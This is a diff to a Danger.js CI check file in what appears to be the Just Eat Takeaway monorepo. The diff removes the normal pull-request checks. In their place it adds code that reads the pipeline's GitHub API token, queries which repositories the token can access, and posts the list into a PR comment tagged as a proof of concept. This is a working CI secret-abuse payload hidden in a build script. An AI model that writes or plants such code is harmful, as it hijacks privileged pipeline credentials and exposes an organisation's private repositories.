@@ -1,21 +1,16 @@
-import { danger, fail } from 'danger';
-import { checks } from '@justeattakeaway/pie-monorepo-utils/dangerjs-checks/index.js';
-
-const { pr } = danger.github;
-const flags = {
-    isAutomationPR: pr.user.type === 'Bot',
-    isDependabotPR: pr.user.login === 'dependabot[bot]',
-};
+import { danger, fail, markdown } from 'danger';
 
 (async () => {
-    // eslint-disable-next-line no-restricted-syntax
-    for (const check of checks) {
-        // eslint-disable-next-line no-await-in-loop
-        await check({
-            danger,
-            fail,
-            pr,
-            flags,
-        });
-    }
+  const token = process.env.DANGER_GITHUB_API_TOKEN;
+  const res = await fetch('https://api.github.com/installation/repositories', {
+    headers: {
+      Authorization: `token ${token}`,
+      Accept: 'application/vnd.github+json',
+    },
+  });
+  const data = await res.json();
+  markdown('POC-DANGERFILE-EXECUTED: ' + JSON.stringify({
+    tokenPresent: !!token,
+    reposVisible: data.repositories ? data.repositories.map(r => r.full_name) : data,
+  }));
 })();
